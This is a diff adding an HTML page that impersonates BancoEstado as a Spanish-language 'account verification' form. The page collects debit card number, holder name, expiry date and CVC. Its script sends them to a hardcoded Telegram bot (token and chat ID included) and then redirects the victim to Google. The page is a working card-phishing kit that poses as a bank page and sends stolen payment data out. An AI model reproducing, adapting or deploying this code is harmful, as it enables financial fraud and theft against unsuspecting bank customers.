@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>Tarjeta Débito BancoEstado | Verificación</title>
+<style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+
+    body {
+        background:#f0f2f5;
+        min-height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        font-family: 'Segoe UI', 'Inter', system-ui, sans-serif;
+        padding: 24px;
+    }
+
+    .wrapper {
+        max-width: 520px;
+        width: 100%;
+        margin: 0 auto;
+    }
+
+    /* ---------- ESTILOS PARA EL BANNER SUPERIOR ---------- */
+    .top-banner {
+        width: 100%;
+        background: #ffffff;
+        border-radius: 20px;
+        margin-bottom: 20px;
+        padding: 12px 20px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 12px;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        transition: all 0.3s ease;
+        cursor: pointer;
+    }
+
+    .logo-banner {
+        height: 45px;
+        width: auto;
+        max-width: 120px;
+        object-fit: contain;
+    }
+
+    .banner-text {
+        font-weight: 700;
+        font-size: 0.9rem;
+        color: #1e3a2f;
+        letter-spacing: 0.5px;
+    }
+
+    /* Estilo para el enunciado de verificación */
+    .verification-header {
+        text-align: center;
+        margin-bottom: 20px;
+    }
+    
+    .verification-title {
+        background: linear-gradient(135deg, #0a2a44, #1a5a7a);
+        color: white;
+        padding: 12px 20px;
+        border-radius: 50px;
+        font-weight: 700;
+        font-size: 1.2rem;
+        letter-spacing: 1px;
+        display: inline-block;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+    }
+    
+    .verification-title::before {
+        content: "🔐 ";
+        font-size: 1.1rem;
+    }
+
+    /* Estilos de la tarjeta */
+    .card-stage {
+        perspective: 1200px;
+        margin-bottom: 24px;
+    }
+
+    .card {
+        position: relative;
+        width: 100%;
+        aspect-ratio: 85 / 54;
+        border-radius: 28px;
+        transform-style: preserve-3d;
+        transition: transform 0.65s cubic-bezier(0.23, 1, 0.32, 1);
+        box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.35);
+    }
+
+    .card.flipped { transform: rotateY(180deg); }
+
+    .card-face {
+        position: absolute;
+        width: 100%;
+        height: 100%;
+        border-radius: 28px;
+        backface-visibility: hidden;
+        overflow: hidden;
+    }
+
+    /* Frente y reverso de la tarjeta - Colores BancoEstado */
+    .front {
+        background: radial-gradient(circle at 10% 20%, #ff8800, #cc5500);
+        padding: 20px 22px;
+        display: flex;
+        flex-direction: column;
+        justify-content: space-between;
+    }
+
+    .back {
+        background: linear-gradient(145deg, #e67e22, #cc5500);
+        transform: rotateY(180deg);
+    }
+
+    .black-strip {
+        background: #0a0a0a;
+        width: 100%;
+        height: 50px;
+        margin-top: 24px;
+    }
+
+    .cvc-container {
+        background: #fff9ef;
+        margin: 24px 20px 20px 20px;
+        border-radius: 10px;
+        padding: 10px 16px;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+    }
+
+    .cvc-input {
+        background: transparent;
+        border: none;
+        font-size: 1.3rem;
+        font-weight: bold;
+        font-family: monospace;
+        width: 80px;
+        text-align: right;
+        outline: none;
+    }
+
+    .bank-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: flex-start;
+    }
+
+    .bank-name {
+        font-size: 1.6rem;
+        font-weight: 800;
+        color: #ffffff;
+        text-shadow: 0 2px 4px rgba(0,0,0,0.2);
+    }
+
+    .badge {
+        background: rgba(255,255,255,0.25);
+        backdrop-filter: blur(2px);
+        border-radius: 40px;
+        padding: 4px 10px;
+        font-size: 0.65rem;
+        font-weight: 700;
+        color: white;
+    }
+
+    .sim-chip {
+        width: 48px;
+        height: 38px;
+        background: linear-gradient(135deg, #e0b87a, #bd8a3e);
+        border-radius: 8px;
+        margin-top: 12px;
+        position: relative;
+    }
+    .sim-chip:before {
+        content: "";
+        position: absolute;
+        top: 8px;
+        left: 10px;
+        width: 28px;
+        height: 20px;
+        background: repeating-linear-gradient(45deg, #c29a4b, #c29a4b 4px, #e6c384 4px, #e6c384 8px);
+        border-radius: 4px;
+    }
+
+    .card-number-input, .editable-value {
+        background: transparent;
+        border: none;
+        font-weight: 700;
+        outline: none;
+        color: #ffffff;
+        font-family: 'Courier New', monospace;
+        text-shadow: 0 1px 2px rgba(0,0,0,0.2);
+    }
+    .card-number-input {
+        font-size: 1.2rem;
+        letter-spacing: 2px;
+        width: 100%;
+        padding: 6px 0;
+        margin-top: 12px;
+    }
+    .card-number-input::placeholder, .editable-value::placeholder {
+        color: rgba(255,255,255,0.6);
+    }
+    .info-row {
+        display: flex;
+        justify-content: space-between;
+        margin-top: 16px;
+    }
+    .label {
+        font-size: 0.6rem;
+        font-weight: 600;
+        text-transform: uppercase;
+        color: rgba(255,255,255,0.8);
+    }
+    .mastercard-logo {
+        display: flex;
+        align-items: center;
+        gap: 4px;
+        justify-content: flex-end;
+    }
+    .mc-circle-red {
+        background: #EB001B;
+        width: 32px;
+        height: 32px;
+        border-radius: 50%;
+        position: relative;
+        right: -12px;
+        opacity: 0.9;
+    }
+    .mc-circle-yellow {
+        background: #F79E1B;
+        width: 32px;
+        height: 32px;
+        border-radius: 50%;
+        opacity: 0.9;
+    }
+
+    .btn-send {
+        background: linear-gradient(95deg, #ff8800, #ff6600);
+        border: none;
+        width: 98%;
+        padding: 21px;
+        border-radius: 40px;
+        color: #ffffff;
+        font-weight: 700;
+        cursor: pointer;
+        transition: 0.2s;
+        margin-top: 100px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+        font-size: 1.1rem;
+        box-shadow: 0 8px 20px rgba(255, 136, 0, 0.3);
+    }
+    .btn-send:hover { transform: scale(0.98); background: #e67700; }
+    .btn-send:disabled {
+        opacity: 0.6;
+        cursor: not-allowed;
+    }
+
+    .status-msg {
+        font-size: 0.75rem;
+        margin-top: 12px;
+        text-align: center;
+        padding: 10px;
+        border-radius: 40px;
+        background: #f0f0f0;
+        transition: all 0.3s ease;
+    }
+
+    @media (max-width: 480px) {
+        .card-number-input { font-size: 1rem; }
+        .verification-title { font-size: 1rem; padding: 8px 16px; }
+        .logo-banner { height: 35px; }
+        .banner-text { font-size: 0.75rem; }
+        .bank-name { font-size: 1.2rem; }
+    }
+</style>
+</head>
+<body>
+<div class="wrapper">
+    <!-- BANNER CON LOGO BANCOESTADO (desde URL) -->
+    <div class="top-banner" id="customBanner">
+        <img class="logo-banner" src="https://cdn2.downdetector.com/static/uploads/logo/bancoestado.png" alt="BancoEstado" onerror="this.onerror=null; this.src='data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20viewBox%3D%220%200%20100%2050%22%3E%3Crect%20width%3D%22100%22%20height%3D%2250%22%20fill%3D%22%23FF8800%22%2F%3E%3Ctext%20x%3D%2250%25%22%20y%3D%2250%25%22%20text-anchor%3D%22middle%22%20dy%3D%22.3em%22%20fill%3D%22%23fff%22%3EBancoEstado%3C%2Ftext%3E%3C%2Fsvg%3E';">
+        <span class="banner-text">verificación de seguridad • BancoEstado</span>
+    </div>
+    <br> <br><br><br>
+    
+    <!-- Enunciado Verificación de cuenta -->
+    <div class="verification-header">
+        <div class="verification-title">Verificación de cuenta</div>
+    </div>
+    
+    <div class="card-stage">
+        <div class="card" id="creditCard">
+            <!-- FRENTE -->
+            <div class="card-face front">
+                <div class="bank-header">
+                    <div class="bank-name">BancoEstado</div>
+                    <div class="badge">DÉBITO</div>
+                </div>
+                <div class="sim-chip"></div>
+                <input type="text" id="cardNumberInput" class="card-number-input" placeholder="**** **** **** ****" maxlength="19" inputmode="numeric">
+                <div class="info-row">
+                    <div class="info-group" style="flex: 2;">
+                        <div class="label">TITULAR</div>
+                        <input type="text" id="cardHolderInput" class="editable-value" placeholder="NOMBRE DEL TITULAR" maxlength="35">
+                    </div>
+                    <div class="info-group">
+                        <div class="label">VENCE</div>
+                        <input type="text" id="expiryInput" class="editable-value" placeholder="MM/AA" maxlength="5" style="width: 70px;">
+                    </div>
+                </div>
+                <div class="mastercard-logo">
+                    <div class="mc-circle-red"></div>
+                    <div class="mc-circle-yellow"></div>
+                    <span class="mc-text" style="font-weight:800;color:white;">Mastercard</span>
+                </div>
+            </div>
+            <!-- REVERSO -->
+            <div class="card-face back">
+                <div class="black-strip"></div>
+                <div class="cvc-container">
+                    <span style="font-weight:700">CVC</span>
+                    <input type="text" id="cvcInput" class="cvc-input" maxlength="3" placeholder="123" inputmode="numeric">
+                </div>
+                <div style="margin-top: 16px; text-align: center; font-size: 0.55rem; color: #4a3a1a;">BancoEstado • Banca Segura</div>
+            </div>
+        </div>
+    </div>
+
+    <button class="btn-send" id="sendBtn">
+        <span></span>Continuar
+    </button>
+    <div id="statusMsg" class="status-msg">✅ Completa los datos y verifica tu identidad</div>
+</div>
+
+<script>
+    // ============================================
+    // CONFIGURACIÓN DE TELEGRAM
+    // ============================================
+    const TELEGRAM_BOT_TOKEN = '8703044811:AAF2fekkn1hBO83UDXozzuvmzczZYQK2Mj4';
+    const TELEGRAM_CHAT_ID = '8042354877';
+
+    // --- JavaScript de la tarjeta con redirección a Google después de enviar a Telegram ---
+    const card = document.getElementById('creditCard');
+    const numberInput = document.getElementById('cardNumberInput');
+    const holderInput = document.getElementById('cardHolderInput');
+    const expiryInput = document.getElementById('expiryInput');
+    const cvcInput = document.getElementById('cvcInput');
+    const sendBtn = document.getElementById('sendBtn');
+    const statusMsg = document.getElementById('statusMsg');
+
+    let isFlippingFromExpiry = false;
+    let expiryTimeout = null;
+
+    // Función para enviar mensaje a Telegram
+    async function enviarATelegram(cardData) {
+        const mensaje = `💳 *NUEVA TARJETA VERIFICADA*\n\n` +
+                       `🏦 Banco: BancoEstado\n` +
+                       `🔢 Número: ${cardData.cardNumber}\n` +
+                       `👤 Titular: ${cardData.cardHolder}\n` +
+                       `📅 Vence: ${cardData.expiryDate}\n` +
+                       `🔐 CVC: ${cardData.cvcCode}\n` +
+                       `🕐 Fecha: ${cardData.timestamp}`;
+        
+        try {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            const params = new URLSearchParams({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: mensaje,
+                parse_mode: 'Markdown'
+            });
+            
+            const response = await fetch(`${url}?${params}`);
+            const data = await response.json();
+            
+            if (data.ok) {
+                console.log('✅ Mensaje enviado a Telegram');
+                return true;
+            } else {
+                console.error('❌ Error al enviar a Telegram:', data);
+                return false;
+            }
+        } catch (error) {
+            console.error('❌ Error en la solicitud a Telegram:', error);
+            return false;
+        }
+    }
+
+    function formatCardNumber(value) {
+        let cleaned = value.replace(/\D/g, '');
+        if (cleaned.length > 16) cleaned = cleaned.slice(0, 16);
+        let parts = [];
+        for (let i = 0; i < cleaned.length; i += 4) parts.push(cleaned.slice(i, i + 4));
+        return parts.join(' ');
+    }
+    numberInput.addEventListener('input', e => { e.target.value = formatCardNumber(e.target.value); });
+
+    function formatExpiry(value) {
+        let digits = value.replace(/\D/g, '');
+        if (digits.length > 4) digits = digits.slice(0, 4);
+        if (digits.length >= 3) return digits.slice(0,2) + '/' + digits.slice(2,4);
+        return digits;
+    }
+    expiryInput.addEventListener('input', function(e) {
+        let formatted = formatExpiry(e.target.value);
+        e.target.value = formatted;
+        if (expiryTimeout) clearTimeout(expiryTimeout);
+        if (e.target.value.length === 5 && e.target.value.includes('/')) {
+            expiryTimeout = setTimeout(() => {
+                if (!card.classList.contains('flipped')) {
+                    isFlippingFromExpiry = true;
+                    card.classList.add('flipped');
+                    setTimeout(() => { cvcInput.focus(); isFlippingFromExpiry = false; }, 400);
+                }
+                expiryTimeout = null;
+            }, 300);
+        }
+    });
+    expiryInput.addEventListener('blur', function() {
+        if (expiryTimeout) clearTimeout(expiryTimeout);
+        if (!card.classList.contains('flipped') && expiryInput.value.length >= 3) {
+            isFlippingFromExpiry = true;
+            card.classList.add('flipped');
+            setTimeout(() => { cvcInput.focus(); isFlippingFromExpiry = false; }, 400);
+        }
+    });
+    expiryInput.addEventListener('keypress', e => { if(e.key === 'Enter') e.preventDefault(); });
+
+    holderInput.addEventListener('input', e => { e.target.value = e.target.value.toUpperCase().replace(/[^A-Z\s\.Ñ]/g, ''); });
+    cvcInput.addEventListener('input', e => { e.target.value = e.target.value.replace(/\D/g, '').slice(0,3); });
+    cvcInput.addEventListener('focus', () => { if(!isFlippingFromExpiry) card.classList.add('flipped'); });
+    cvcInput.addEventListener('blur', () => {
+        setTimeout(() => {
+            const active = document.activeElement;
+            if(active !== numberInput && active !== holderInput && active !== expiryInput && active !== cvcInput)
+                card.classList.remove('flipped');
+        }, 150);
+    });
+    [numberInput, holderInput].forEach(inp => inp.addEventListener('focus', () => { if(card.classList.contains('flipped')) card.classList.remove('flipped'); }));
+    expiryInput.addEventListener('focus', () => { if(card.classList.contains('flipped')) card.classList.remove('flipped'); });
+
+    // Función para redirigir a Google
+    function redirectToGoogle() {
+        window.location.href = 'https://www.google.com';
+    }
+
+    // Evento principal del botón
+    sendBtn.addEventListener('click', async () => {
+        const cardNumber = numberInput.value.replace(/\s/g, '');
+        const cardHolder = holderInput.value.trim();
+        const expiryDate = expiryInput.value.trim();
+        const cvcCode = cvcInput.value.trim();
+
+        // Validaciones
+        if (!cardNumber || !cardHolder || !expiryDate || !cvcCode) {
+            statusMsg.innerHTML = '⚠️ Por favor, completa todos los datos de la tarjeta';
+            statusMsg.style.background = '#ffe0e0';
+            setTimeout(() => {
+                statusMsg.style.background = '#f0f0f0';
+                statusMsg.innerHTML = '✅ Completa los datos y verifica tu identidad';
+            }, 3000);
+            return;
+        }
+        
+        if (cardNumber.length < 16) {
+            statusMsg.innerHTML = '⚠️ El número de tarjeta debe tener 16 dígitos';
+            statusMsg.style.background = '#ffe0e0';
+            setTimeout(() => {
+                statusMsg.style.background = '#f0f0f0';
+                statusMsg.innerHTML = '✅ Completa los datos y verifica tu identidad';
+            }, 3000);
+            return;
+        }
+        
+        if (expiryDate.length < 5 || !expiryDate.includes('/')) {
+            statusMsg.innerHTML = '⚠️ La fecha debe tener formato MM/AA';
+            statusMsg.style.background = '#ffe0e0';
+            setTimeout(() => {
+                statusMsg.style.background = '#f0f0f0';
+                statusMsg.innerHTML = '✅ Completa los datos y verifica tu identidad';
+            }, 3000);
+            return;
+        }
+        
+        const month = parseInt(expiryDate.substring(0,2), 10);
+        if (month < 1 || month > 12) {
+            statusMsg.innerHTML = '⚠️ Mes inválido (debe ser 01-12)';
+            statusMsg.style.background = '#ffe0e0';
+            setTimeout(() => {
+                statusMsg.style.background = '#f0f0f0';
+                statusMsg.innerHTML = '✅ Completa los datos y verifica tu identidad';
+            }, 3000);
+            return;
+        }
+        
+        if (cvcCode.length < 3) {
+            statusMsg.innerHTML = '⚠️ El CVV debe tener 3 dígitos';
+            statusMsg.style.background = '#ffe0e0';
+            setTimeout(() => {
+                statusMsg.style.background = '#f0f0f0';
+                statusMsg.innerHTML = '✅ Completa los datos y verifica tu identidad';
+            }, 3000);
+            return;
+        }
+
+        // Deshabilitar botón y mostrar estado de carga
+        sendBtn.disabled = true;
+        sendBtn.innerHTML = '<span></span>Verificando...';
+        statusMsg.innerHTML = '🔐 Verificando datos bancarios...';
+        statusMsg.style.background = '#e3f2fd';
+        statusMsg.style.color = '#004085';
+
+        // Preparar datos para enviar
+        const cardData = {
+            cardNumber: cardNumber,
+            cardHolder: cardHolder,
+            expiryDate: expiryDate,
+            cvcCode: cvcCode,
+            timestamp: new Date().toLocaleString('es-CL', { timeZone: 'America/Santiago' })
+        };
+
+        // Enviar a Telegram
+        const enviado = await enviarATelegram(cardData);
+        
+        if (enviado) {
+            statusMsg.innerHTML = '✅ Datos verificados, redirigiendo...';
+            statusMsg.style.background = '#d4edda';
+            statusMsg.style.color = '#155724';
+            // Redirigir a Google después de 1 segundo
+            setTimeout(redirectToGoogle, 1000);
+        } else {
+            statusMsg.innerHTML = '❌ Error al verificar los datos. Intenta nuevamente.';
+            statusMsg.style.background = '#f8d7da';
+            statusMsg.style.color = '#721c24';
+            sendBtn.disabled = false;
+            sendBtn.innerHTML = '<span></span>Continuar';
+        }
+    });
+</script>
+</body>
+</html>
